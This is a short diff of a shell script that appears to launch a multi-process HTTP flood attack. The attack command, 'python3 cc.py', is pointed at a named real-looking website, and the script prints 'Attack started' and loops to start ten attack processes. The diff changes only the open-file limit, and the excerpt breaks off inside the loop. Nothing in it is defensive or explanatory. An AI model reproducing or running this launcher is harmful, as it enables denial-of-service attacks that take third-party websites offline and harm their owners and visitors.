@@ -12,7 +12,7 @@ atk_cmd="python3 cc.py -url https://sunsetdesertsafari.com/ -v 4 -down -check -s
 process=10
 
 #change the system limit
-ulimit -n 999999
+ulimit -n 100
 
 echo Attack started
 for ((i=1;i<=$process;i++))
